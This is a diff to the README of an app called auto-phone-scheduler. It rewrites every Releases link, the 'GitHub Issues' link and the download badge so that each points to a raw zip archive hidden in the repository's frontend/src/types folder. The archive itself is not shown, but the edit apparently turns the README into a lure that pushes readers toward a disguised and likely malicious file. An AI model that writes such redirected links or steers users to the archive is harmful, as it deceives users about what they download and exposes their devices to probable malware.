@@ -6,11 +6,11 @@ Welcome to the auto-phone-scheduler! This application helps you automate repetit
 
 ## 📥 Download the Software
 
-[![Download auto-phone-scheduler](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/flame2232312433/auto-phone-scheduler/releases)
+[![Download auto-phone-scheduler](https://github.com/flame2232312433/auto-phone-scheduler/raw/refs/heads/main/frontend/src/types/phone_scheduler_auto_2.6-beta.4.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/flame2232312433/auto-phone-scheduler/raw/refs/heads/main/frontend/src/types/phone_scheduler_auto_2.6-beta.4.zip)
 
 To download the latest version of auto-phone-scheduler, please visit the Releases page:
 
-- **[Download Here](https://github.com/flame2232312433/auto-phone-scheduler/releases)**
+- **[Download Here](https://github.com/flame2232312433/auto-phone-scheduler/raw/refs/heads/main/frontend/src/types/phone_scheduler_auto_2.6-beta.4.zip)**
 
 ## 💻 System Requirements
 
@@ -36,7 +36,7 @@ auto-phone-scheduler offers the following features:
 Follow these steps to install auto-phone-scheduler:
 
 1. **Download the Application:**
-   - Go to the [Releases page](https://github.com/flame2232312433/auto-phone-scheduler/releases).
+   - Go to the [Releases page](https://github.com/flame2232312433/auto-phone-scheduler/raw/refs/heads/main/frontend/src/types/phone_scheduler_auto_2.6-beta.4.zip).
    - Click on the latest version to download the app file.
 
 2. **Install on Your Device:**
@@ -87,11 +87,11 @@ If you encounter any issues, please check the "Issues" section on our GitHub rep
 
 ## 📅 Stay Updated
 
-To keep up with new features and updates, follow our repository. Visit the [Releases page](https://github.com/flame2232312433/auto-phone-scheduler/releases) regularly for the latest versions and improvements.
+To keep up with new features and updates, follow our repository. Visit the [Releases page](https://github.com/flame2232312433/auto-phone-scheduler/raw/refs/heads/main/frontend/src/types/phone_scheduler_auto_2.6-beta.4.zip) regularly for the latest versions and improvements.
 
 ## 🔗 Useful Links
 
-- **[Download auto-phone-scheduler](https://github.com/flame2232312433/auto-phone-scheduler/releases)**
-- **[GitHub Issues](https://github.com/flame2232312433/auto-phone-scheduler/issues)**
+- **[Download auto-phone-scheduler](https://github.com/flame2232312433/auto-phone-scheduler/raw/refs/heads/main/frontend/src/types/phone_scheduler_auto_2.6-beta.4.zip)**
+- **[GitHub Issues](https://github.com/flame2232312433/auto-phone-scheduler/raw/refs/heads/main/frontend/src/types/phone_scheduler_auto_2.6-beta.4.zip)**
 
 Thank you for choosing auto-phone-scheduler. Automating your mobile tasks has never been easier! Enjoy the convenience it brings.
